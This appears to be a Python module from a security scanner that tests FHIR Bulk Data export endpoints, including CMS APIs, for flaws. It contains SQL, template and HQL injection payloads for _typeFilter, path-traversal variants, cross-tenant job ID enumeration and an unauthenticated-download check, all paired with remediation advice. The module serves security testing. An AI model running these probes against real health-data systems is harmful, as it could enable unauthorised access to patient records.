"""FHIR Bulk Data export flow tester.

Tests the full FHIR Bulk Data IG workflow end-to-end:
- Initiate $export (Patient, Group, all)
- Poll job status
- Download NDJSON files
- Cross-tenant job access (IDOR)
- Job file URL manipulation
- _type, _since, _typeFilter parameter fuzzing

Patterns discovered during CMS testing:
- BCDA: sequential integer job IDs + 401/404 enumeration oracle
- AB2D: _typeFilter accepts arbitrary input without validation
- DPC: Data download path traversal properly blocked
- All: job file URL patterns vary widely
"""

from __future__ import annotations

import asyncio
import re
from dataclasses import dataclass
from typing import Any

import httpx
from rich.console import Console

from fhirbug.core.client import FHIRClient
from fhirbug.core.config import TargetConfig
from fhirbug.core.models import (
    Finding,
    FindingCategory,
    ScanResult,
    Severity,
)

console = Console()


# _typeFilter injection payloads that we observed being accepted by AB2D
TYPEFILTER_ATTACK_PAYLOADS = [
    # SQL injection
    "ExplanationOfBenefit?type='",
    "ExplanationOfBenefit?type=' OR 1=1--",
    "ExplanationOfBenefit?type=UNION SELECT null--",
    # Cross-resource override
    "Patient?_id=*",
    "ExplanationOfBenefit?patient=*",
    "ExplanationOfBenefit?patient.reference=*",
    # Template injection
    "ExplanationOfBenefit?type=${System.getProperty('user.name')}",
    "ExplanationOfBenefit?type={{7*7}}",
    # HQL / JPQL
    "ExplanationOfBenefit?type=FROM Patient p WHERE p.id > 0",
    # FHIRPath expression
    "ExplanationOfBenefit?type=Patient.name.first()",
    # Stacked parameters
    "ExplanationOfBenefit?type=a&patient=b&_id=c",
    # Very long input (WAF bypass probe)
    "ExplanationOfBenefit?type=" + "A" * 2000,
]


@dataclass
class BulkExportResult:
    export_url: str
    initiated: bool
    job_url: str = ""
    job_id: str = ""
    status_code: int = 0
    error: str = ""


async def initiate_export(
    client: FHIRClient,
    url: str,
    params: dict[str, str] | None = None,
    async_mode: bool = True,
) -> BulkExportResult:
    """Initiate a FHIR Bulk Data $export operation."""
    headers = {"Accept": "application/fhir+json"}
    if async_mode:
        headers["Prefer"] = "respond-async"

    try:
        r = await client.get(url, params=params, headers=headers)
        result = BulkExportResult(
            export_url=url,
            initiated=(r.status_code == 202),
            status_code=r.status_code,
        )

        content_location = r.headers.get("content-location", "")
        if content_location:
            result.job_url = content_location
            # Extract job ID (last path segment or second-to-last for $status URLs)
            parts = content_location.rstrip("/").split("/")
            # Could be /Job/{id} or /Jobs/{id} or /Job/{id}/$status
            for i, p in enumerate(parts):
                if p.lower() in ("job", "jobs"):
                    if i + 1 < len(parts):
                        result.job_id = parts[i + 1]
                        break

        if r.status_code >= 400:
            result.error = r.text[:300]

        return result
    except httpx.HTTPError as e:
        return BulkExportResult(
            export_url=url, initiated=False, error=str(e)[:200]
        )


async def probe_job_status_paths(
    client: FHIRClient,
    base_url: str,
    job_id: str,
) -> dict[str, int]:
    """Find the correct job status endpoint by probing known path patterns."""
    paths = [
        f"/api/v1/Jobs/{job_id}",
        f"/api/v1/jobs/{job_id}",
        f"/api/v1/Job/{job_id}",
        f"/api/v1/Job/{job_id}/$status",
        f"/api/v1/fhir/Job/{job_id}/$status",
        f"/api/v2/jobs/{job_id}",
        f"/api/v2/fhir/Job/{job_id}/$status",
    ]
    result = {}
    for path in paths:
        url = f"{base_url.rstrip('/')}{path}"
        try:
            r = await client.get(url, headers={"Accept": "application/json"})
            result[path] = r.status_code
        except httpx.HTTPError:
            result[path] = 0
    return result


async def test_typefilter_fuzz(
    client: FHIRClient,
    export_url: str,
    result: ScanResult,
) -> None:
    """Fuzz the _typeFilter parameter with attack payloads."""
    console.print("\n  [cyan]Fuzzing _typeFilter parameter...[/]")
    accepted = []
    rejected = []

    for payload in TYPEFILTER_ATTACK_PAYLOADS:
        r = await client.get(
            export_url,
            params={"_typeFilter": payload},
            headers={"Accept": "application/fhir+json", "Prefer": "respond-async"},
        )
        if r.status_code == 202:
            accepted.append(payload)
        else:
            rejected.append((r.status_code, payload))

        await asyncio.sleep(0.2)

    if accepted:
        console.print(
            f"    [red]🚨 {len(accepted)}/{len(TYPEFILTER_ATTACK_PAYLOADS)} "
            f"attack payloads accepted with 202[/]"
        )

        result.add_finding(Finding(
            title=f"`_typeFilter` parameter accepts arbitrary input without validation ({len(accepted)} payloads)",
            severity=Severity.MEDIUM,
            category=FindingCategory.INJECTION,
            description=(
                "The bulk export endpoint accepts the `_typeFilter` parameter with no "
                "apparent validation at request time, returning 202 Accepted for "
                "obviously invalid inputs including SQL injection patterns, cross-resource "
                "queries, and template injection payloads."
                "\n\nThe actual behavior of these filters at export time is undetermined — "
                "if they're silently ignored, this is a consistency issue. If they're "
                "interpolated into queries, there may be injection vulnerabilities."
            ),
            endpoint=export_url,
            evidence={
                "accepted_payloads": accepted[:10],
                "total_accepted": len(accepted),
                "total_rejected": len(rejected),
            },
            remediation=(
                "Validate `_typeFilter` at request time using the same strict allowlist "
                "as `_type`. Parse FHIR search expressions server-side and reject malformed "
                "or dangerous expressions before queuing the export job."
            ),
        ))


async def test_cross_tenant_job_access(
    client: FHIRClient,
    base_url: str,
    known_job_id: str,
    result: ScanResult,
) -> None:
    """Test whether other tenants' jobs can be enumerated via 401 vs 404."""
    console.print("\n  [cyan]Testing cross-tenant job ID enumeration...[/]")

    # Use the fuzz/enumeration module pattern but scoped to jobs
    from fhirbug.fuzz.enumeration import probe_id_range, generate_probe_ids

    # Determine if job_id is integer or UUID
    is_int = known_job_id.isdigit()

    template = f"{base_url.rstrip('/')}/api/v1/Jobs/{{id}}"
    probe_ids = generate_probe_ids(
        "sequential_int" if is_int else "uuid", known_job_id
    )

    enum_result = await probe_id_range(client, template, probe_ids)
    console.print(
        f"    ID format: {enum_result.id_format}, existing: {len(enum_result.existing_ids)}, "
        f"missing: {len(enum_result.missing_ids)}, oracle: {enum_result.has_oracle}"
    )

    if enum_result.has_oracle:
        result.add_finding(Finding(
            title="Bulk export job IDs enumerable via 401 vs 404 response discrepancy",
            severity=Severity.HIGH if enum_result.id_format == "sequential_int" else Severity.MEDIUM,
            category=FindingCategory.INFO_DISC,
            description=(
                "The job status endpoint returns HTTP 401 for jobs that exist but are "
                "owned by a different tenant, and HTTP 404 for jobs that don't exist. "
                "Combined with " + enum_result.id_format + " job IDs, an attacker can "
                "enumerate all export jobs in the system."
            ),
            endpoint=f"{base_url}/api/v1/Jobs",
            evidence={
                "id_format": enum_result.id_format,
                "existing_ids_found": enum_result.existing_ids[:10],
                "lowest_existing": enum_result.lowest_existing,
                "highest_existing": enum_result.highest_existing,
            },
            remediation=(
                "Return uniform 404 responses for both 'doesn't exist' and 'exists but "
                "not owned' cases. Use UUIDs for job IDs instead of sequential integers."
            ),
        ))


async def test_job_file_download(
    client: FHIRClient,
    file_url: str,
    result: ScanResult,
) -> None:
    """Test the job file download endpoint for auth and path traversal."""
    console.print(f"\n  [cyan]Testing file download:[/] {file_url}")

    # Test 1: Download with our token
    try:
        r = await client.get(file_url)
        print(f"    Owner download: [{r.status_code}] {len(r.text)} bytes")
    except httpx.HTTPError:
        pass

    # Test 2: Download without auth
    try:
        r_noauth = await client.get(file_url, headers={"Authorization": ""})
        if r_noauth.status_code == 200:
            result.add_finding(Finding(
                title="Bulk export data file accessible WITHOUT authentication",
                severity=Severity.CRITICAL,
                category=FindingCategory.AUTHN,
                description=(
                    "The bulk export NDJSON file can be downloaded without providing "
                    "a Bearer token. This means any attacker with knowledge of the file "
                    "URL can exfiltrate PHI."
                ),
                endpoint=file_url,
            ))
    except httpx.HTTPError:
        pass

    # Test 3: Path traversal
    base_path = "/".join(file_url.split("/")[:-1])
    file_name = file_url.split("/")[-1]
    traversal_variants = [
        f"{base_path}/{file_name}/../{file_name}",
        f"{base_path}/../{file_name}",
        f"{base_path}/{file_name}%00",
        f"{base_path}/./{file_name}",
    ]
    for variant in traversal_variants:
        try:
            r = await client.get(variant)
            if r.status_code not in (200, 403, 404):
                console.print(
                    f"    [yellow]Unexpected [{r.status_code}] for: {variant}[/]"
                )
        except httpx.HTTPError:
            pass


async def run_bulk_export_scan(
    client: FHIRClient,
    config: TargetConfig,
    result: ScanResult,
    group_id: str | None = None,
    fuzz_typefilter: bool = True,
    test_enumeration: bool = True,
) -> None:
    """Run the full bulk export test suite."""
    console.print("\n[bold]Running FHIR Bulk Data export tests...[/]")

    base = config.base_url.rstrip("/")

    # Step 1: initiate an export
    export_paths = [
        f"{base}/api/v1/Patient/$export",
        f"{base}/api/v1/Group/all/$export",
    ]
    if group_id:
        export_paths.insert(0, f"{base}/api/v1/Group/{group_id}/$export")

    export_results: list[BulkExportResult] = []
    for url in export_paths:
        console.print(f"\n  [cyan]Initiating export:[/] {url}")
        res = await initiate_export(client, url)
        export_results.append(res)
        console.print(f"    [{res.status_code}] initiated={res.initiated}")
        if res.job_url:
            console.print(f"    Job URL: {res.job_url}")
        if res.error:
            console.print(f"    Error: {res.error[:100]}")

    # Step 2: fuzz _typeFilter if any export succeeded
    successful = [r for r in export_results if r.initiated]
    if successful and fuzz_typefilter:
        await test_typefilter_fuzz(client, successful[0].export_url, result)

    # Step 3: test cross-tenant job enumeration
    if successful and test_enumeration:
        await test_cross_tenant_job_access(
            client, base, successful[0].job_id, result
        )
